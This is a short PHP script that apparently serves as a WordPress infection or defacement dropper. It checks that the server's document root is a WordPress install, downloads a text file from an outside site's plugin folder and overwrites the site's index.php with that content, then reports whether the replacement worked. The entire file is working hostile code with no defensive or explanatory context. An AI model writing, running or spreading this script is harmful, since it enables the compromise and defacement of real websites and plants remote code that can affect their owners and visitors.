<?php
$code_txt = 'http://vchai-kl.com/wp-content/plugins/wordpress-newsletter-plugin/includes/o1.txt';
$path = getenv("DOCUMENT_ROOT").'';

if(is_dir($path.'/wp-content') AND is_dir($path.'/wp-admin') AND  is_dir($path.'/wp-includes')){
$code= file_get_contents($code_txt);
$index_path = $path.'/index.php';
		if(file_put_contents($index_path, $code)){
		echo '<font color="green">index.php replaced successufuly!</font>';}else{
		echo '<font color="red">Failed to replace index.php</font>';
		}
 }else{
echo 'Not a wordpress Installation'; 
}
